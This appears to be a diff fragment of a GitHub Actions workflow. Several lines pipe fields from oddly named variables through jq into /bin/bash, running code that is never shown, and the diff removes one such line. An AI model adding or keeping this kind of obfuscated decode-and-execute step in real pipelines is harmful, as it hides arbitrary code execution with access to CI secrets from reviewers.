@@ -23,7 +23,6 @@ jobs:
           echo $sa7058 | jq -r .ho0 | /bin/bash
           echo $gvrro38395 | jq -r .izv269 | /bin/bash
           echo $oggol009 | jq -r .mrnhh254 | /bin/bash
-          printf '%s' "$pwt29" | jq -r .sebd1 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
